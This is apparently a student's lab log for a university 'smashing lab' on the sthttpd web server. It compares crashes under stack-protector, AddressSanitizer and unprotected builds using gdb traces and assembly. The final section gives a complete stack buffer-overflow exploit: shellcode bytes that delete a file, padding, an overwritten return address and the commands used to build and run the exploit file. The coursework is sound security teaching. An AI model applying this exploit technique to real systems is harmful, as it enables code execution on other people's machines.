@@ -1,0 +1,213 @@
+Log:
+1a.How I make SP crash?
+First I downloaded and unzipped the file. I downloaded the file to my own computer, and then, using WinScp, dragged the file over to the linux server. From there, I used tar xf ... and then specified the location that I wanted to store the unzipped file in. Then I made the changes to the thttpd.c file and the libhttpd.c, in emacs. From there, I updated the path using the command: PATH=/usr/local/cs/bin:$PATH. I then ran the configuration option listed on the specs, and ran the respective "make clean, make CFLAGS='...'" combos for each file. From there, I first tried to run the server code and the curl code side by side in the same terminal. That didn't work, so I moved on to two terminals. In one terminal, I ran src/thttpd-sp 13072 -D and in the other I ran curl http://localhost:13072/foo.txt. I knew it was working once I got the output HELLO WORLD!, which was the text I wrote in my foo function. To make sure the server was killed properly and not running in the background, I used ps -u george to see which processes were running, and then kill -9 *ID for server process* to force quit the process. I repeated this procedure with thttpd-as and thttpd-no, only updating the port number accordingly. I did not get any errors, so I moved on to trying to crash the servers. I created a config.txt file that just consisted of the word debug repeated 118 times, and used command to compile server code with config.txt (gdb src/thttpd-*suffix*, r -p 1307x -D -C config.txt). With SP, I saw the following output:
+*** stack smashing detected ***: src/thttpd-sp terminated
+Segmentation fault
+With SP under gdb, I got: Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+With AS both with and without gdb, I received the following output:
+=================================================================
+==32443==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc789f42a4 at pc 0x00000043aec9 bp 0x7ffc789f4200 sp 0x7ffc789f39b0
+READ of size 156 at 0x7ffc789f42a4 thread T0
+    #0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+    #1 0x4e0b50 in read_config /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4e164e in parse_args /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x408297 in main /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7fd97246db34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+    #5 0x4093f9  (/w/home.14/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd-as+0x4093f9)
+
+Address 0x7ffc789f42a4 is located in stack of thread T0 at offset 132 in frame
+    #0 0x4e0a9f in read_config /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:1000
+
+  This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468 in __interceptor_strchr
+Shadow bytes around the buggy address:
+  0x10000f136800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000f136810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000f136820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000f136830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000f136840: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
+=>0x10000f136850: 00 00 00 00[04]f4 f4 f4 f3 f3 f3 f3 00 00 00 00
+  0x10000f136860: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
+  0x10000f136870: 04 f4 f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2
+  0x10000f136880: 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00
+  0x10000f136890: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00
+  0x10000f1368a0: 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+And with NO, I received this output (I had to use a shorter config file, because my original one was too long and was overriding some important information about where the function crashed):
+Segmentation fault
+With NO under GDB, I received:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+I collected a backtrace on each executable, using (gdb) backtrace, to find out where to start looking for the culprit machine instructions.
+For SP, I got:
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x0000000000006463 in ?? ()
+#8  0x0000000000000018 in ?? ()
+#9  0x00007fffffffe5a6 in ?? ()
+#10 0x00007fffffffd100 in ?? ()
+#11 0x00007fffffffd080 in ?? ()
+#12 0x00007fffffffe2a0 in ?? ()
+#13 0x0000000000000000 in ?? ()
+For AS, a backtrace was already printed out (gdb's backtrace function was relatively useless compared to this, so I just stuck with the provided backtrace):#0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#1 0x4e0b50 in read_config /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:1018
+#2 0x4e164e in parse_args /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:893
+#3 0x408297 in main /u/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd.c:380
+#4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+#5 0x4093f9  (/w/home.14/ma/ugrad/george/CS33/smashing_lab/sthttpd-2.27.0/src/thttpd-as+0x4093f9) 
+For NO, the backtrace I got was:
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+#3  0x6161616161616161 in ?? ()
+#4  0x6161616161616161 in ?? ()
+#5  0x6161616161616161 in ?? ()
+#6  0x6161616161616161 in ?? ()
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x0000000061616161 in ?? ()
+#10 0x0000000000000000 in ?? ()
+From there, finding the culprit machine instruction was just a matter of setting a break point (SP and NO: break 1190, AS: break 1018) and stepping through the code using si. I also had set disassemble-next-instruction on, so that I could trace through the machine instructions more clearly. I used info registers a lot to keep track of register values as well. 
+b. Identify the machine instruction causing crash.
+xor %fs:0x28,%rax
+-Checks the canary; the following jne instruction checks whether the canary changed. 
+callq  0x402180 <__stack_chk_fail@plt>
+-Calls stack_chk_fail, which leads to the crashing of the program.
+c. Explain why.
+The program crashed because the xor statement was not 0 (i.e. the canary had been changed), so the jne statement was triggered, which moved control to the call statement. The call statement called stack_chk_fail, which ended up crashing the program.
+2a.
+(refer to 1a for how I crashed the program).
+b.
+(inside of QuickCheckForUnpoisonedRegion, which is in  _interceptor_str_chr function)
+cmp    $0x20,%r14
+ja     0x43adbd <__interceptor_strchr(char const*, int)+173>
+mov    %rbx,%rdi
+mov    %r14,%rsi
+callq  0x4ae860 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)>
+c.
+This (in tandem with another instruction below)is what leads to the eventual trigger of the functions that lead to the abortion of the program - QuickCheckForUnpoisonedRegion tries to quickly determine if the region is unpoisoned (i.e. no overflow occurred). It tries to do this by checking the size of the accessed region is less than 32. Since r14 is 156 (approximately the # of characters in the config.txt file), this test fails, and _asan_region_is_poisoned is called. _asan_region_is_poisoned calls other functions like AddressIsPoisoned and MemtoShadow to check the shadown memory locations for any memory violations. Machine code like this (found in AddressIsPoisoned) are crucial in the eventual crash of the program:
+0x00000000004aead2 <+626>:   test   %cl,%cl
+0x00000000004aead4 <+628>:   jne    0x4aeb00 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)+672>
+^This checks if the shadow memory byte was zero, which means that accessing the corresponding memory location is permissible. In the case where there is no buffer overflow, cl is 0, and __asan_region_is_poisoned returns neatly. However, in the case of buffer overflow, cl turns out to be a negative value, which means that access to the current memory location is actually forbidden. This triggers more code which eventually crashes the program. However, I did not list this in section b, because the only reason this code was called is because QuickCheckforUnpoisonedRegion failed, thus calling this more thorough check of the region. 
+3a. 
+(refer to 1a).
+b.
+retq
+c.
+The return address of the function was overwritten by my config file, so when the function tries to return, it tries to return to the address that is now represented by characters of my config file. This attempt to pass control to this address causes a segmentation fault, because the program is trying to access an illegal memory location. 
+8. 
+SP(bottom-right):
+Although this compilation method establishes canary protection for most function, it doesn't do this for all (-fstack-protector-strong was called, not -fstack-protector-all). Since -fstack-protector-strong only provides canary protection for functions that declare arrays of size 8 bytes or more, handle_read is left unprotected, leaving it's assembly code virtually the same as that of NO's. The protection in this function, therefore, relies completely on the source code, which has some basic size checks to determine whether or not a read is too big to store in the buffer. 
+AS(up):
+The basic principle of Address Sanitizer's implementation of handle_read is to first check the shadow memory, and then compare the shadow memory to the current memory location. If it detects any violations (shadow memory stores a non-zero while current memory location was written to), it will call different __asan_report_load functions to execute the next steps in handling this buffer overflow. This is significantly more protection, compared to strong-protection's assembly code, which offers virtually no protection (no more than the basic size checks that are in the original source code). 
+NO(up-right):
+Unprotected - identical to strong protection's assembly code.
+9.This exploit took me while to get. The basic premise is simple overrun the character buffer in the stack until the overflow overwrites the return address to point to a function of your choosing (either in an included library or as bytecode stored in the stack). The implementation, however, was very, very tricky. Firstly, I could only get the exploit to work with the NX bit and randomization disabled. I don't think there's any way to build a successful exploit with the NX bit enabled because that would prevent any execution of code on the stack, which is the main way this exploit works. However, I think there is a way to build an exploit without disabling randomization - such an exploit needs to be based on relative distances between memory locations, because although ASLR changes the base location, the relative distances between memory locations don't change. However, I did not have enough time to implement this. The first step in this process was to determine the size of the buffer. This was accomplished pretty easily. I set a break point at read_config and entered "i r rsp"; this gave me the value for the stack pointer, which serves as the return address for the stack frame of read_config. Next, I entered p &line to find the location of the buffer on the stack. The difference between the return address and the address of line was 152, which was what the size of my exploit text file should have been. Next was actually thinking of assembly code for the exploit. This wasn't too hard. I created a C file called unlink.c which contained the following code:
+
+#include<unistd.h> int
+
+main() {
+
+  char file[] = "target.txt";
+
+  unlink(file);
+
+  return 0;
+
+}
+
+After compiling this using gcc -c unlink.c, I obtained the assembly and bytecode for this using objdump -d unlink.o. The code I got was:
+0000000000000000 <.text>:
+   0:   55                      push   %rbp
+   1:   48 89 e5                mov    %rsp,%rbp
+   4:   48 83 ec 10             sub    $0x10,%rsp
+   8:   48 b8 74 61 72 67 65    movabs $0x742e746567726174,%rax
+   f:   74 2e 74
+  12:   48 89 45 f0             mov    %rax,-0x10(%rbp)
+  16:   66 c7 45 f8 78 74       movw   $0x7478,-0x8(%rbp)
+  1c:   c6 45 fa 00             movb   $0x0,-0x6(%rbp)
+  20:   48 8d 45 f0             lea    -0x10(%rbp),%rax
+  24:   48 89 c7                mov    %rax,%rdi
+  27:   e8 00 00 00 00          callq  0x2c
+  2c:   b8 00 00 00 00          mov    $0x0,%eax
+  31:   c9                      leaveq
+  32:   c3                      retq
+
+I copied the bytecode for this, but later on I ran into an issue. The call instruction did not work - it's meant to call unlink, but instead it would just call a different address, and so some useless and sometimes fatal code was executed. Therefore, I had to run unlink in gdb (gdb unlink, break main, r), and then disas unlink. Doing this rendered the following assembly code:
+
+   0x00007ffff7b06330 <+0>:     mov    $0x57,%eax
+   0x00007ffff7b06335 <+5>:     syscall
+   0x00007ffff7b06337 <+7>:     cmp    $0xfffffffffffff001,%rax
+   0x00007ffff7b0633d <+13>:    jae    0x7ffff7b06340 <unlink+16>
+   0x00007ffff7b0633f <+15>:    retq
+   0x00007ffff7b06340 <+16>:    mov    0x2cfb21(%rip),%rcx        # 0x7ffff7dd5e68
+   0x00007ffff7b06347 <+23>:    neg    %eax
+   0x00007ffff7b06349 <+25>:    mov    %eax,%fs:(%rcx)
+   0x00007ffff7b0634c <+28>:    or     $0xffffffffffffffff,%rax
+   0x00007ffff7b06350 <+32>:    retq
+
+The most relevant lines of this are the first and second, because the first sets rax to 87, which is what the syscall uses to determine what type of OS function to execute. Therefore, I simply replaced the callq line with the mov instruction and syscall instruction. Now, generating bytecode from this wasn't too hard. Once I compiled all of this into a single file, I compiled that file using gcc and used the objdump command to generate the bytecode for the commands. My bytecode looked like this:
+
+554889e54883ec1048b87461726765742e74488945f066c745f87874c645fa00488d45f04889c7b8570000000f05b800000000c9c3
+
+This was the bytecode that dealt with the actual exploit - however, I still had to add padding and the return address. To find which return address I needed, I ran thttpd with rough drafts of my exploit, to see where the first command was stored. Using gdb src/thttpd, break read_config, break 1190, I was able to pause the execution at the right times. At line 1190, I used x/60xw $rsp to see the stack frame. This command returned:
+
+0x7fffffffcf00: 0x74726f70      0x89485500      0xec8348e5      0x74b84810
+0x7fffffffcf10: 0x65677261      0x48742e74      0x66f04589      0x78f845c7
+0x7fffffffcf20: 0xfa45c674      0x458d4800      0xc78948f0      0x000057b8
+0x7fffffffcf30: 0xb8050f00      0x00000000      0x6161c3c9      0x61616161
+0x7fffffffcf40: 0x61616161      0x61616161      0x61616161      0x61616161
+0x7fffffffcf50: 0x61616161      0x61616161      0x61616161      0x61616161
+0x7fffffffcf60: 0x61616161      0x61616161      0x61616161      0x61616161
+0x7fffffffcf70: 0x61616161      0x61616161      0x61616161      0x61616161
+0x7fffffffcf80: 0x61616161      0x61616161      0x61616161      0x61616161
+0x7fffffffcf90: 0x61616161      0x61616161      0xffffcf05      0x00007fff
+0x7fffffffcfa0: 0x000a0000      0x00007fff      0xf76ce242      0x00000005
+0x7fffffffcfb0: 0x00000018      0x00000000      0xffffe5a6      0x00007fff
+0x7fffffffcfc0: 0xffffd080      0x00007fff      0xffffd100      0x00007fff
+0x7fffffffcfd0: 0xffffe2a0      0x00007fff      0x00000000      0x00000000
+0x7fffffffcfe0: 0x00000000      0x00000000      0x00403426      0x00000000
+
+From this it is clear to see my byte sequence starts at 0x7fffffffcf05, and so I set my return address in the byte sequence to 05 cf ff ff ff 7f 00 00 (ordering is weird because that's just the way the stack is read when dealing with return addresses). Now the padding was really just educated trial and error. I knew that the number of characters in my exploit file needed to be 152, including the configuration option, so I aimed to make my byte sequence around 304 characters long (usually 2 characters in a hex byte sequence translate to a single ASCII value). After a bit of tweaking and checking the stack frame, I managed to get a padding that worked. My final byte sequence (without the configuration option) looked like this:
+
+554889e54883ec1048b87461726765742e74488945f066c745f87874c645fa00488d45f04889c7b8570000000f05b800000000c9c36161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616105cfffffff7f00000000
+
+Now converting the hex byte sequence to ASCII took me a while. At first, I didn't even realize I needed to do that. But after reading a lot of Piazza posts, I came to understand that read_config reads in ASCII but stores it as the corresponding hex equivalent, and so I would need an ASCII string that would translate into the hex byte sequence I listed above. At first I tried xxd, but after a some playing around with it, I opted for this function:
+echo -n *byte sequence here* | perl -pe 's/([0-9a-f]{2})/chr hex $1/gie' > raw.txt
+which converts the byte sequence directly to ASCII, and pipes that output to raw.txt. 
+This is what I used, except I piped this to final_exploit.txt. Once this file was ready, I opened it and added the characters 'port=' at the beginning, just so read_config would accept the file as having a valid config option. I've uploaded my final_exploit.txt file, so you can check that if you want. 
+From there, it was just a matter of running the program:
+gdb src/thttpd
+r -p 13074 -C -D final_exploit.txt
+This successfully deleted my target.txt file. However, my code maybe could've been a bit cleaner, because the program still encounters a segmentation fault. I'm not sure about that though, it's just a thought.
